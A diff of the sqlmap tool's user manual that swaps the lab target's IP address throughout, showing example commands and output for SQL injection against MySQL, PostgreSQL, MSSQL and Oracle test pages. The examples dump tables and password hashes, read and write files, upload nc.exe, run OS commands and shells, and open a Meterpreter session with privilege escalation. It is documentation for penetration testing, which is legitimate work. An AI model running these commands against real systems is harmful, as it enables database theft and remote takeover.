-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --tables \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --tables \
   -D test -v 0
 
 Database: test
@@ -3226,7 +3195,7 @@ Database: test
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --tables \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" --tables \
   -D users -v 0
 
 Database: USERS
@@ -3265,7 +3234,7 @@ and optionally on <tt>-D</tt> to specify the database name.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --columns \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --columns \
   -T users -D test -v 1
 
 [...]
@@ -3296,7 +3265,7 @@ Table: users
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --columns \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --columns \
   -T users -D master -v 0
 
 Database: master
@@ -3315,7 +3284,7 @@ Table: users
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --columns \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --columns \
   -T users -D public -v 0
 
 Database: public
@@ -3343,7 +3312,7 @@ If the database name is not specified, the current database name is used.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --columns \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --columns \
   -T users -v 1
 
 [...]
@@ -3393,7 +3362,7 @@ If the database name is not specified, the current database name is used.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --dump \
   -T users -v 1
 
 [...]
@@ -3435,7 +3404,7 @@ that you want to enumerate the entries.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dump \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --dump \
   -T users -D master -C surname -v 0
 
 Database: master
@@ -3461,7 +3430,7 @@ by providing a verbosity level greater than or equal to 1.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --dump \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --dump \
   -T users -D public -v 1
 
 [...]
@@ -3479,10 +3448,10 @@ Table: users
 +----+----------------------------------------------+-------------------+
 
 [hh:mm:59] [INFO] Table 'public.users' dumped to CSV file '/software/sqlmap/output/
-192.168.1.121/dump/public/users.csv'
+172.16.213.131/dump/public/users.csv'
 [...]
 
-$ cat /software/sqlmap/output/192.168.1.121/dump/public/users.csv 
+$ cat /software/sqlmap/output/172.16.213.131/dump/public/users.csv 
 "id","name","surname"
 "1","luther","blissett"
 "2","fluffy","bunny"
@@ -3506,7 +3475,7 @@ to a range of character positions provided with <tt>-</tt><tt>-first</tt> and/or
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --dump \
   -T users -D test --start 2 --stop 4 -v 0
 
 Database: test
@@ -3538,7 +3507,7 @@ It is possible to dump all databases tables entries at once.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump-all -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --dump-all -v 0
 
 Database: test
 Table: users
@@ -3609,7 +3578,7 @@ tables.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dump-all \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --dump-all \
   --exclude-sysdbs -v 0
 
 Database: master
@@ -3674,7 +3643,7 @@ multiple statements on the back-end database management system.
 Examples on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --sql-query \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
   "SELECT 'foo'" -v 1
 
 [...]
@@ -3685,7 +3654,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --sql
 [hh:mm:14] [INFO] performed 27 queries in 0 seconds
 SELECT 'foo':    'foo'
 
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --sql-query \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
   "SELECT 'foo', 'bar'" -v 1
 
 [...]
@@ -3711,7 +3680,7 @@ Otherwise, in UNION query SQL injection technique it only performs a single
 HTTP request to get the user's query output:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --sql-query \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
   "SELECT 'foo', 'bar'" -v 1 --union-use
 
 [...]
@@ -3744,7 +3713,7 @@ the whole output in a single response.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-query \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --sql-query \
   "SELECT usename FROM pg_user" -v 0
 
 [hh:mm:32] [INPUT] can the SQL query provided return multiple entries? [Y/n] y
@@ -3772,7 +3741,7 @@ whole output in a single response.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-query \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --sql-query \
   "SELECT host, password FROM mysql.user LIMIT 1, 3" -v 1
 
 [...]
@@ -3822,7 +3791,7 @@ Note that this feature provides TAB completion and history support.
 Example of history support on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-shell -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --sql-shell -v 0
 
 sql> SELECT 'foo'
 SELECT 'foo':    'foo'
@@ -3834,7 +3803,7 @@ SELECT version():    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc
 
 sql> exit
 
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-shell -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --sql-shell -v 0
 
 sql> [UP arrow key shows 'exit', then DOWN arrow key clean the shell]
 sql> SELECT usename, passwd FROM pg_shadow ORDER BY usename
@@ -3854,7 +3823,7 @@ SELECT usename, passwd FROM pg_shadow ORDER BY usename [3]:
 Example of TAB completion on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-shell -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --sql-shell -v 0
 
 sql> [TAB TAB]
  LIMIT 
@@ -3895,7 +3864,7 @@ can run whatever <tt>SELECT</tt> statement you want.
 Example of asterisk expansion on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-shell \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --sql-shell \
   -v 1
 
 [...]
@@ -3993,7 +3962,7 @@ Example of SQL statement other than <tt>SELECT</tt> on a <bf>PostgreSQL
 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-shell -v 1
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --sql-shell -v 1
 
 [...]
 back-end DBMS: PostgreSQL
@@ -4077,7 +4046,7 @@ These techniques are detailed in white paper
 Example on a <bf>PostgreSQL 8.3.5</bf> target to retrieve a text file:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.aspx?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.aspx?id=1" \
   --read-file "C:\example.txt" -v 2
 
 [...]
@@ -4126,11 +4095,11 @@ sqlmapfile
 [hh:mm:22] [DEBUG] cleaning up the database management system
 [hh:mm:22] [DEBUG] removing support tables
 [hh:mm:22] [DEBUG] query: DROP TABLE sqlmapfile
-C:/example.txt file saved to:    '/home/inquis/sqlmap/output/192.168.1.121/files/C__example.txt'
+C:/example.txt file saved to:    '/home/inquis/sqlmap/output/172.16.213.131/files/C__example.txt'
 
-[hh:mm:22] [INFO] Fetched data logged to text files under '/home/inquis/sqlmap/output/192.168.1.121'
+[hh:mm:22] [INFO] Fetched data logged to text files under '/home/inquis/sqlmap/output/172.16.213.131'
 
-$ cat output/192.168.1.121/files/C__example.txt 
+$ cat output/172.16.213.131/files/C__example.txt 
 This is a text file
 </verb></tscreen>
 
@@ -4139,7 +4108,7 @@ Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> target to
 retrieve a binary file:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/iis/get_str2.asp?name=luther" \
   --read-file "C:\example.exe" --union-use -v 1
 
 [...]
@@ -4157,24 +4126,24 @@ injection vulnerability
 'name' by appending a false condition after the parameter value
 [hh:mm:49] [INFO] the target url is affected by an exploitable partial (single entry) 
 inband sql injection vulnerability
-valid union:    'http://192.168.1.121:80/sqlmap/mssql/iis/get_str2.asp?name=luther' UNION 
+valid union:    'http://172.16.213.131/sqlmap/mssql/iis/get_str2.asp?name=luther' UNION 
 ALL SELECT NULL, NULL, NULL-- AND 'sjOfJ'='sjOfJ'
 
 [hh:mm:49] [INFO] testing stacked queries support on parameter 'name'
 [hh:mm:54] [INFO] the web application supports stacked queries on parameter 'name'
 [hh:mm:54] [INFO] fetching file: 'C:/example.exe'
 [hh:mm:54] [INFO] the SQL query provided returns 3 entries
-C:/example.exe file saved to:    '/home/inquis/sqlmap/output/192.168.1.121/files/
+C:/example.exe file saved to:    '/home/inquis/sqlmap/output/172.16.213.131/files/
 C__example.exe'
 
 [hh:mm:54] [INFO] Fetched data logged to text files under '/home/inquis/sqlmap/output/
-192.168.1.121'
+172.16.213.131'
 
-$ ls -l output/192.168.1.121/files/C__example.exe 
--rw-r--r-- 1 inquis inquis 2560 2009-MM-DD hh:mm output/192.168.1.121/files/C__example.exe
+$ ls -l output/172.16.213.131/files/C__example.exe 
+-rw-r--r-- 1 inquis inquis 2560 2009-MM-DD hh:mm output/172.16.213.131/files/C__example.exe
 
-$ file output/192.168.1.121/files/C__example.exe 
-output/192.168.1.121/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit
+$ file output/172.16.213.131/files/C__example.exe 
+output/172.16.213.131/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit
 </verb></tscreen>
 
 
@@ -4206,7 +4175,7 @@ $ file /tmp/nc.exe.packed
 $ ls -l /tmp/nc.exe.packed
 -rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /tmp/nc.exe.packed
 
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.aspx?id=1" --write-file \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.aspx?id=1" --write-file \
   "/tmp/nc.exe.packed" --dest-file "C:\WINDOWS\Temp\nc.exe" -v 1
 
 [...]
@@ -4273,7 +4242,7 @@ It is possible to specify a single command to be executed with the
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.aspx?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.aspx?id=1" \
   --os-cmd "whoami" -v 1
 
 [...]
@@ -4306,7 +4275,7 @@ command standard output:    'w2k3dev\postgres'
 Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/iis/get_str2.asp?name=luther" \
   --os-cmd "whoami" --union-use -v 1
 
 [...]
@@ -4324,7 +4293,7 @@ injection vulnerability
 by appending a false condition after the parameter value
 [hh:mm:58] [INFO] the target url is affected by an exploitable partial (single entry) inband 
 sql injection vulnerability
-valid union:    'http://192.168.1.121:80/sqlmap/mssql/iis/get_str2.asp?name=luther' UNION 
+valid union:    'http://172.16.213.131/sqlmap/mssql/iis/get_str2.asp?name=luther' UNION 
 ALL SELECT NULL, NULL, NULL-- AND 'SonLv'='SonLv'
 
 [hh:mm:58] [INFO] testing stacked queries support on parameter 'name'
@@ -4350,7 +4319,7 @@ the same TAB completion and history functionalities as provided by
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.aspx?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.aspx?id=1" \
   --os-shell -v 2
 
 [...]
@@ -4465,7 +4434,7 @@ command standard output quicker, via UNION based SQL injection, when the
 parameter is affected also by inband SQL injection vulnerability:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.aspx?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.aspx?id=1" \
   --os-shell -v 2 --union-use
 
 [...]
@@ -4479,7 +4448,7 @@ technique
 [hh:mm:16] [INFO] confirming full inband sql injection on parameter 'id'
 [hh:mm:16] [INFO] the target url is affected by an exploitable full inband sql injection 
 vulnerability
-valid union:    'http://192.168.1.121:80/sqlmap/mysql/iis/get_int.aspx?id=1 UNION ALL SELECT 
+valid union:    'http://172.16.213.131/sqlmap/mysql/iis/get_int.aspx?id=1 UNION ALL SELECT 
 NULL, NULL, NULL# AND 528=528'
 
 [hh:mm:16] [INFO] testing stacked queries support on parameter 'id'
@@ -4544,7 +4513,7 @@ Windows IP Configuration
 Ethernet adapter Local Area Connection 2:
 
    Connection-specific DNS Suffix  . : localdomain
-   IP Address. . . . . . . . . . . . : 192.168.1.121
+   IP Address. . . . . . . . . . . . : 172.16.213.131
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
 ---Default Gateway . . . . . . . . . : 192.168.1.1
 
@@ -4594,7 +4563,7 @@ These techniques are detailed in white paper
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.aspx?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.aspx?id=1" \
   --os-pwn -v 1 --msf-path /home/inquis/software/metasploit
 
 [...]
@@ -4625,7 +4594,7 @@ back-end DBMS: MySQL >= 5.0.0
 [3] Reverse TCP
 [4] Reverse TCP (No NX)
 > 1
-[hh:mm:24] [INFO] which is the back-end DBMS address? [192.168.1.121] 192.168.1.121
+[hh:mm:24] [INFO] which is the back-end DBMS address? [172.16.213.131] 172.16.213.131
 [hh:mm:24] [INFO] which remote port numer do you want to use? [61588] 61588
 [hh:mm:24] [INFO] which payload do you want to use?
 [1] Reflective Meterpreter (default)
@@ -4662,7 +4631,7 @@ It might only slow down a bit the execution of sqlmap
 [*] Starting the payload handler...
 [*] Transmitting intermediate stager for over-sized stage...(216 bytes)
 [*] Sending stage (718336 bytes)
-[*] Meterpreter session 1 opened (192.168.1.161:47832 -> 192.168.1.121:61588)
+[*] Meterpreter session 1 opened (192.168.1.161:47832 -> 172.16.213.131:61588)
 
 meterpreter > Loading extension priv...success.
 meterpreter > getuid
@@ -4678,7 +4647,7 @@ Netmask     : 255.0.0.0
 
 VMware Accelerated AMD PCNet Adapter
 Hardware MAC: 00:0c:29:29:ee:86
-IP Address  : 192.168.1.121
+IP Address  : 172.16.213.131
 Netmask     : 255.255.255.0
 
 
@@ -4722,7 +4691,7 @@ Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> running as
 <tt>NETWORK SERVICE</tt> on the target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/iis/get_str2.asp?name=luther" \
   --os-pwn -v 1 --msf-path /home/inquis/software/metasploit --priv-esc
 
 [...]
@@ -4854,7 +4823,7 @@ Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> running as
 <tt>Administrator</tt> on the target:
 
 <tscreen><verb>
-$ sudo python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+$ sudo python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/iis/get_str2.asp?name=luther" \
   --os-smbrelay -v 1 --msf-path /home/inquis/software/metasploit
 
 [...]
@@ -5006,7 +4975,7 @@ This technique is detailed in white paper
 Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ sudo python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+$ sudo python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/iis/get_str2.asp?name=luther" \
   --os-bof -v 1 --msf-path /home/inquis/software/metasploit
 
 [...]
@@ -5149,7 +5118,7 @@ This is useful if you stop the injection and resume it after some time.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -b \
   -v 1 -s "sqlmap.log"
 
 [...]
@@ -5168,16 +5137,16 @@ retrieving the PostgreSQL banner and logged the session to text file
 $ cat sqlmap.log
 
 [hh:mm:00 MM/DD/YY]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection point][GET]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection parameter][id]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection type][numeric]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Parenthesis][0]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][CONCAT('9', '9')][]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH(SYSDATE)][]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][COALESCE(3, NULL)][3]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH('3')][1]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][DBMS][PostgreSQL]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][VERSION()][PostgreSQL 8.3.5 
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][Injection point][GET]
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][Injection parameter][id]
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][Injection type][numeric]
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][Parenthesis][0]
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][CONCAT('9', '9')][]
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH(SYSDATE)][]
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][COALESCE(3, NULL)][3]
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH('3')][1]
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][DBMS][PostgreSQL]
+[http://172.16.213.131/sqlmap/pgsql/get_int.php][GET][id=1][VERSION()][PostgreSQL 8.3.5 
 on i486-pc-
 </verb></tscreen>
 
@@ -5200,7 +5169,7 @@ retrieved then calculates the query length, in the example
 retrieved to the end of the query output.
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -b \
   -v 1 -s "sqlmap.log"
 
 [...]
@@ -5244,7 +5213,7 @@ attack.
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" -b \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" -b \
   --eta -v 1
 
 [...]
@@ -5272,7 +5241,7 @@ banner:    'Oracle Database 10g Express Edition Release 10.2.0.1.0 - Product'
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" \
   --users --eta -v 1
 
 [...]
@@ -5358,7 +5327,7 @@ file.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -b \
   -v 1 --save
 
 [hh:mm:33] [INFO] saved command line options on '/software/sqlmap/sqlmap-SAUbs.conf' 
@@ -5375,7 +5344,7 @@ INI file, <tt>sqlmap-SAUbs.conf</tt>.
 <tscreen><verb>
 $ cat sqlmap-SAUbs.conf
 [Target]
-url = http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1
+url = http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1
 googledork = 
 list = 
 
@@ -5492,7 +5461,7 @@ option, and leave sqlmap to go for a default behaviour.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_str.php?id=1&amp;name=luther" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int_str.php?id=1&amp;name=luther" \
   --batch -v 1
 
 [hh:mm:22] [INFO] testing if GET parameter 'id' is dynamic
@@ -5541,7 +5510,7 @@ done with owning the underlying operating system or file system.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/iis/get_int.aspx?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/iis/get_int.aspx?id=1" \
   -v 2 --cleanup
 
 [...]
